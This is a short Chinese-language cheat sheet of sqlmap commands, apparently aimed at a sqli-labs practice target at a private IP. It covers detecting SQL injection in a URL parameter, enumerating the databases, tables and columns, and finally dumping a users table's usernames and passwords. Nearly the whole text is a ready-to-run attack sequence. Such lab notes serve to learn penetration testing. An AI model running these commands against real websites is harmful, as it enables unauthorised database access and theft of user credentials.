对url进行检测，判断是否存在SQL注入

```shell
sqlmap.py -u url --batch

sqlmap.py -u http://193.168.10.26/Less-1/?id=2 --batch
```



获取数据库
获取全部数据库

```shell
sqlmap.py -u url --dbs --batch

sqlmap.py -u http://193.168.10.26/Less-1/?id=2 --dbs --batch
```



获取当前数据库

```shell
sqlmap.py -u url --current-db --batch

sqlmap.py -u http://193.168.10.26/Less-1/?id=2 --current-db --batch
```



获取数据库中的表

```shell
sqlmap.py -u url -D DB --tables --batch

sqlmap.py -u http://193.168.10.26/Less-1/?id=2 -D security --tables --batch
```



获取表中的列

```shell
sqlmap.py -u url -D DB -T TBL --columns --batch

sqlmap.py -u http://193.168.10.26/Less-1/?id=2 -D security -T users --columns --batch
```



获取列中的数据

```shell
sqlmap.py -u url -D DB -T TBL -C COL --dump --batch

sqlmap.py -u http://193.168.10.26/Less-1/?id=2 -D security -T users -C "id,username,password" --dump --batch
```

